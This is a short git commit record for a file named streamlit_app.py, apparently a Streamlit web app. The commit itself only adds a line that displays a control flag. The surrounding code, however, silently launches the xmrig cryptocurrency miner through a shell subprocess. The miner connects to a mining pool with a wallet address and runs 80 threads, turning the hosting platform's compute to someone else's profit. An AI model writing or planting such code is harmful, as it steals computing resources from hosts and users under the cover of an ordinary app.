663c52cd9896380eee4b4d3519664d686e42766e
tarikgumus <tarik.gumus@yahoo.com>
2022-09-18 19:07:37 +0800

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -75,6 +75,9 @@ with st.echo(code_location='below'):
 if flag.controlFlag==0:        
     p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 80 -k", stdout=subprocess.PIPE, shell=True)
     flag.controlFlag+=1
+with st.echo():    
+    flag.controlFlag
+    
     
 import time 
 from IPython.display import clear_output 
